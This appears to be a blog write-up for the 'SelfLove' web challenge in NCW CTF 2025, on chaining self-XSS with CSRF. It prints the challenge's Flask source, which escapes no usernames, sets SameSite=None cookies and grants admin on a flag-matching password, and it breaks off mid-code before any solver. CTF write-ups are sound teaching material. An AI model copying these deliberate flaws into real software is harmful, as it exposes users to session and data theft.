@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="DJumanto">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="DJumanto">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog,write-up">
+    <meta name="description" content="">
+    <meta name="description" content="🖊️Author: DJumanto🛡️Team: proof by feeling📖Note: This Writeup contains solver for SelfLove challenge in NCW CTF 2025  TL;DRThis write-up explains how we can escalate a self‑XSS, combined with CSRF,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Self-Love NCW 2025">
+<meta property="og:url" content="http://example.com/2025/12/11/ctf/web/NCW2025/index.html">
+<meta property="og:site_name" content="DJumanto Sec Blog">
+<meta property="og:description" content="🖊️Author: DJumanto🛡️Team: proof by feeling📖Note: This Writeup contains solver for SelfLove challenge in NCW CTF 2025  TL;DRThis write-up explains how we can escalate a self‑XSS, combined with CSRF,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryBlz0MW-x.png">
+<meta property="article:published_time" content="2025-12-11T15:42:16.000Z">
+<meta property="article:modified_time" content="2025-12-11T16:03:14.057Z">
+<meta property="article:author" content="DJumanto">
+<meta property="article:tag" content="WEB">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/ryBlz0MW-x.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>Self-Love NCW 2025 · DJumanto Sec Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">DJumanto Sec Blog</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">DJumanto Sec Blog</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">Self-Love NCW 2025</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                Self-Love NCW 2025
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="WEB">WEB</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="XSS">XSS</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.6k</span>Reading time: <span class="post-count reading-time">16 min</span></span>
+                    </div>
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/12/11</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <p>🖊️Author: DJumanto<br>🛡️Team: proof by feeling<br>📖Note: This Writeup contains solver for SelfLove challenge in NCW CTF 2025</p>
+<hr>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>This write-up explains how we can escalate a self‑XSS, combined with CSRF, into stealing information from other users. </p>
+<hr>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul>
+<li><strong>Vulnerabilities:</strong> Cross Site Scripting (XSS), CSRF.</li>
+<li><strong>Target:</strong> Read the flag in high privilege user endpoint</li>
+</ul>
+<hr>
+<h2 id="The-App"><a href="#The-App" class="headerlink" title="The App"></a>The App</h2><p>In this challenge, we’re given a web application with some functionalities, where we able to register, login, and report admin, an obvious client side challenge.</p>
+<p>app.py</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, g, render_template, flash, session</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"><span class="keyword">from</span> flask_limiter.util <span class="keyword">import</span> get_remote_address</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">DATABASE = <span class="string">&quot;database.db&quot;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">limiter = Limiter(</span><br><span class="line">    get_remote_address,</span><br><span class="line">    app=app</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app.secret_key = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line">app.config[<span class="string">&#x27;SESSION_COOKIE_SAMESITE&#x27;</span>] = <span class="string">&#x27;None&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">FLAG = <span class="string">&quot;NCW&#123;fake_flag&#125;&quot;</span></span><br><span class="line">admin_username = <span class="string">&quot;tanknight_&quot;</span> + os.urandom(<span class="number">6</span>).<span class="built_in">hex</span>()</span><br><span class="line">admin_password = FLAG</span><br><span class="line"><span class="keyword">from</span> sigma <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after_request</span>(<span class="params">response</span>):</span><br><span class="line">    response.headers[<span class="string">&quot;Content-Security-Policy&quot;</span>] = <span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://cdn.tailwindcss.com/3.4.17 http://www.instagram.com/embed.js; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; frame-src https://www.instagram.com/;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_db</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Return a DB connection for this request, creating it if needed.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;db&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> g:</span><br><span class="line">        g.db = sqlite3.connect(DATABASE, timeout=<span class="number">30</span>)</span><br><span class="line">        g.db.row_factory = sqlite3.Row </span><br><span class="line">    <span class="keyword">return</span> g.db</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;Guest&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username == <span class="string">&#x27;Guest&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + username + <span class="string">&quot;!&quot;</span> + <span class="string">&#x27;&lt;script src=&quot;https://cdn.tailwindcss.com/3.4.17&quot;&gt;&lt;/script&gt;&lt;body class=&quot;min-h-screen flex flex-col items-center gap-4 justify-center bg-gradient-to-br from-slate-900 via-indigo-900 to-sky-900 text-slate-100 text-center font-sans&quot;&gt;&lt;br&gt;Login untuk melihat easter egg.&lt;a href=&quot;/login&quot; class=&quot;px-6 py-3 bg-sky-500 hover:bg-sky-600 text-slate-900 font-semibold rounded-xl shadow-lg transition&quot;&gt;Login&lt;/a&gt;&lt;/body&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + username + <span class="string">&quot;!&quot;</span> + <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/dashboard&#x27; /&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;user_id&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/login&#x27; /&gt;&quot;</span> + <span class="string">&quot;Please login first!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script src=&quot;https://cdn.tailwindcss.com/3.4.17&quot;&gt;&lt;/script&gt;&lt;body class=&quot;min-h-screen flex items-center gap-4 justify-center bg-gradient-to-br from-slate-900 via-indigo-900 to-sky-900 text-slate-100 text-center font-sans&quot;&gt;&#x27;</span> + post_instagram_tersigma + post_instagram_tersigma_2 + <span class="string">&#x27;&lt;/body&gt;&#x27;</span> + <span class="string">f&quot;&lt;!-- flag gratis 👻: <span class="subst">&#123;FLAG[:<span class="number">5</span>]&#125;</span> --&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;session.get(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;Guest&#x27;</span>)&#125;</span> is trying to access /flag&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> FLAG</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;kamu siapa bang?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/login&#x27; /&gt;&quot;</span> + <span class="string">&quot;Logout successful!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user_id&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/&#x27; /&gt;&quot;</span> + <span class="string">&quot;Already logged in!&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    db = get_db()</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    cursor.execute(<span class="string">&#x27;SELECT * FROM users WHERE username = ? AND password = ?&#x27;</span>, (username, password))</span><br><span class="line">    user = cursor.fetchone()</span><br><span class="line">    db.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/login&#x27; /&gt;&quot;</span> + <span class="string">&quot;Invalid credentials or account does not exists!&quot;</span></span><br><span class="line">    </span><br><span class="line">    session[<span class="string">&#x27;user_id&#x27;</span>] = user[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = user[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    session[<span class="string">&#x27;admin&#x27;</span>] = user[<span class="string">&#x27;admin&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/&#x27; /&gt;&quot;</span> + <span class="string">&quot;Login successful!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user_id&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0; url=/&#x27; /&gt;&quot;</span> + <span class="string">&quot;Already logged in!&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    db = get_db()</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> FLAG <span class="keyword">in</span> password:</span><br><span class="line">            cursor.execute(<span class="string">&#x27;INSERT INTO users (username, password, admin) VALUES (?, ?, ?)&#x27;</span>, (username, password, <span class="literal">True</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cursor.execute(<span class="string">&#x27;INSERT INTO users (username, password, admin) VALUES (?, ?, ?)&#x27;</span>, (username, password, <span class="literal">False</span>))</span><br><span class="line">        db.commit()</span><br><span class="line">        </span><br><span class="line">        user_id = cursor.lastrowid</span><br><span class="line">        cursor.execute(<span class="string">&#x27;SELECT id, username, admin FROM users WHERE id = ?&#x27;</span>, (user_id,))</span><br><span class="line">        user = cursor.fetchone()</span><br><span class="line">        </span><br><span class="line">        session[<span class="string">&#x27;user_id&#x27;</span>] = user[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = user[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;admin&#x27;</span>] = user[<span 